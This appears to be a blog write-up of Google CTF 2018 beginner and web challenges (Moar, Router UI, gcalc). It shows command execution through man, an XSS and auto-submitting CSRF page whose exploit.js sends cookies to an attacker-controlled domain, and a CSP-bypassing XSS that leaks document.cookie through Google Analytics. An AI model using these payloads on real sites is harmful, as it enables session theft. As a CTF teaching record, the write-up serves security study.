---
title: googlectf2018
date: 2018-06-26 21:10:29
tags:
---

## Beginner's Quest - Moar

When we netcat to the server we can see man socat output only. But man allows us to execute commands. All we need to do is to type !command. Running !ls -la /home/moar reveals some secret file disable_dmz.sh. Let's cat it.

man命令允许执行命令

```
!ls /home/moar
disable_dmz.sh
```

```
Manual page socat(1) line 1 (press h for help or q to quit)!cat /home/moar/disable_dmz.sh
!cat /home/moar/disable_dmz.sh
#!/bin/sh
echo 'Disabling DMZ using password CTF{SOmething-CATastr0phic}'
echo CTF{SOmething-CATastr0phic} > /dev/dmz
```

## Beginner's Router UI

```
 <body class="text-center">
    <form class="form-signin" method="post">
      <h1 class="h3 mb-3 font-weight-normal">OffHub Management Interface</h1>
      <input type="text" name="username" class="form-control" placeholder="username">
      <input type="password" name="password" class="form-control" placeholder="password">
      <button class="btn btn-block" type="submit">Sign in</button>
    </form>
  </body>
```

payload;

```
login:<script src=https:
password:[YOURDOMAIN]/exploit.js></script>
```

结果:

```
<script src=https://YOURDOMAIN/exploit.js></script>
```

由于管理员只会查看邮件，所以需要先构建一个能够自动登录的website.html。

website.html:

```
<!DOCTYPE HTML>
<html lang="en">
<head>
	<meta charset="utf-8" />
	<title>Cats</title>
</head>
<body>
	<form method="POST" action="https://router-ui.web.ctfcompetition.com/login">
		<input name="username" value="&lt;script src=https:">
		<input name="password" value="[YOURDOMAIN]/exploit.js&gt;&lt/script&gt;">
	</form>
	<script>
		document.forms[0].submit();
	</script>
</body>
</html>
```

这样，当管理员点击该页面之后，就会自动登录，从而执行我们的payload。

exploit.js:

```
window.location.href='https://[YOURDOMAIN]/log.php?'+document.cookie;

```

## gcalc

app.js

```js
var e = "function" == typeof Object.assign ? Object.assign : function(a, b) {
        for (var c = 1; c < arguments.length; c++) {
            var d = arguments[c];
            if (d)
                for (var f in d) Object.prototype.hasOwnProperty.call(d, f) && (a[f] = d[f])
        }
        return a
    },
    g = "function" == typeof Object.defineProperties ? Object.defineProperty : function(a, b, c) {
        a != Array.prototype && a != Object.prototype && (a[b] = c.value)
    },
    h = "undefined" != typeof window && window === this ? this : "undefined" != typeof global && null != global ? global : this;

function k(a) {
    if (a) {
        for (var b = h, c = ["Object", "assign"], d = 0; d < c.length - 1; d++) {
            var f = c[d];
            f in b || (b[f] = {});
            b = b[f]
        }
        c = c[c.length - 1];
        d = b[c];
        a = a(d);
        a != d && null != a && g(b, c, {
            configurable: !0,
            writable: !0,
            value: a
        })
    }
}
k(function(a) {
    return a || e
});

function l(a, b, c, d, f) {
    this.location = a;
    this.c = b;
    this.mdDialog = d;
    this.f = f;
    n(this);
    a = a.search();
    if (a.expr && a.vars) try {
        var m = p(a.expr, a.vars);
        this.a = this.screen = "";
        q(this, m);
        this.b.ans = parseFloat(m) || 0
    } catch (v) {
        q(this, "Error")
    }
}
l.$inject = ["$location", "$http", "$httpParamSerializer", "$mdDialog", "vcRecaptchaService"];

function q(a, b) {
    a.screen = a.a ? a.screen + b : b
}

function n(a) {
    a.screen = "0";
    a.a = "";
    a.b = {
        pi: 3.14159,
        ans: 0
    }
}

function p(a, b) {
    a = String(a).toLowerCase();
    b = String(b);
    if (!/^(?:[\(\)\*\/\+%\-0-9 ]|\bvars\b|[.]\w+)*$/.test(a)) throw Error(a);
    b = JSON.parse(b, function(a, b) {
        if (b && "object" === typeof b && !Array.isArray(b)) return Object.assign(Object.create(null), b);
        if ("number" === typeof b) return b
    });
    return (new Function("vars", "return " + a))(b)
}

function r(a) {
    try {
        return p(a.a, JSON.stringify(a.b))
    } catch (b) {
        return "Error"
    }
}

function t(a) {
    var b = new URL("https://gcalc2.web.ctfcompetition.com");
    b.pathname = "/";
    b.searchParams.set("expr", a.a);
    b.searchParams.set("vars", JSON.stringify(a.b));
    return b + ""
}
l.prototype.permalink = function() {
    this.mdDialog.show(this.mdDialog.alert({
        title: "Link",
        htmlContent: t(this),
        ok: "Ok"
    }))
};
l.prototype.showCaptcha = function() {
    this.mdDialog.show({
        contentElement: "#captchaDialog",
        parent: angular.element(document.body)
    })
};
l.prototype.cloud = function() {
    var a = this.f.getResponse();
    a ? (this.c({
        method: "POST",
        url: "/report",
        data: {
            expr: this.a,
            vars: JSON.stringify(this.b),
            recaptcha: a
        }
    }), this.mdDialog.hide()) : alert("Wrong captcha.")
};
l.prototype.btnClick = function(a) {
    if (/[0-9.]/.test(a)) q(this, a), this.a += a;
    else if (/[*\/+%-]/.test(a)) q(this, " " + a + " "), this.a += a;
    else if (/[(]/.test(a)) q(this, " " + a), this.a += a;
    else if (/[)]/.test(a)) q(this, a + " "), this.a += a;
    else if ("\u03c0" == a) q(this, " \u03c0 "), this.a += " vars.pi";
    else switch (a) {
        case "ac":
            n(this);
            break;
        case "ans":
            q(this, " Ans ");
            this.a += " vars.ans";
            break;
        case "=":
            if (!this.a) break;
            a = r(this);
            this.a = this.screen = "";
            q(this, a);
            this.b.ans = parseFloat(a) || 0;
            break;
        case "pow":
            if (!this.a) break;
            a =
                r(this);
            a *= a;
            this.screen = "";
            this.a = parseFloat(a) || 0;
            q(this, a);
            this.b.ans = parseFloat(a) || 0;
            break;
        case "sqrt":
            this.a && (a = Math.sqrt(r(this)), this.screen = "", this.a = parseFloat(a) || 0, q(this, a), this.b.ans = parseFloat(a) || 0)
    }
};

function u(a) {
    a.html5Mode(!0)
}
u.$inject = ["$locationProvider"];
angular.module("calcApp", ["ngMaterial", "ngMessages", "ngSanitize", "vcRecaptcha"]).controller("CalcCtrl", l).config(u);
```

漏洞点：

```
function p(a, b) {
    a = String(a).toLowerCase();
    b = String(b);
    if (!/^(?:[\(\)\*\/\+%\-0-9 ]|\bvars\b|[.]\w+)*$/.test(a)) throw Error(a);
    b = JSON.parse(b, function(a, b) {
        if (b && "object" === typeof b && !Array.isArray(b)) return Object.assign(Object.create(null), b);
        if ("number" === typeof b) return b
    });
    return (new Function("vars", "return " + a))(b)
}
```

该函数用户处理参数a,b对应我们的参数expr, vars。只要能够绕过该过滤即可实现XSS。

有问题的paylaod:

```
// alert(1) // Remove whitespaces by yourself
vars.pi.constructor.constructor(
  vars.pi.toString().constructor.fromCharCode(97)+
  vars.pi.toString().constructor.fromCharCode(108)+
  vars.pi.toString().constructor.fromCharCode(101)+
  vars.pi.toString().constructor.fromCharCode(114)+
  vars.pi.toString().constructor.fromCharCode(116)+
  vars.pi.toString().constructor.fromCharCode(40)+
  vars.pi.toString().constructor.fromCharCode(49)+
  vars.pi.toString().constructor.fromCharCode(41)
)()
```

如果没有`String(a).toLowerCase()`，那么该payload可行。

基础paylaod:

```
https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&vars={"pi":3.14159,"ans":0,"alert(1)":0}
```

使用上边的paylaod，我们可以执行alert()。

接下来就是绕过CSP。

CSP of /：

```
Content-Security-Policy: default-src 'self'; child-src https://sandbox-gcalc2.web.ctfcompetition.com/
```

CSP of  /static/calc.html:

```
Content-Security-Policy: default-src 'self'; frame-ancestors https://gcalc2.web.ctfcompetition.com/; font-src https://fonts.gstatic.com; style-src 'self' https://*.googleapis.com 'unsafe-inline'; script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com 'unsafe-eval' https://www.googletagmanager.com; child-src https://www.google.com/recaptcha/; img-src https://www.google-analytics.com;
```

我们看到``img-src https://www.google-analytics.com;``

那么就可以通过google-analystic获取cookie。

首先申请google-analystic，得到tid=UA-121623607-1

有效payload:

```
https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&vars={%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=hao123%27;document.querySelector(%27body%27).append(x)%22:0}
```

最终payload:

```
https://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&vars={%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=12344%27%2bencodeURIComponent(document.cookie);document.querySelector(%27body%27).append(x)%22:0}
```

google-anaystic-console:

```
https://analytics.google.com/analytics/web/?hl=zh-CN&pli=1#/realtime/rt-event/a121623607w179580825p177873825/metric.type=5/
```

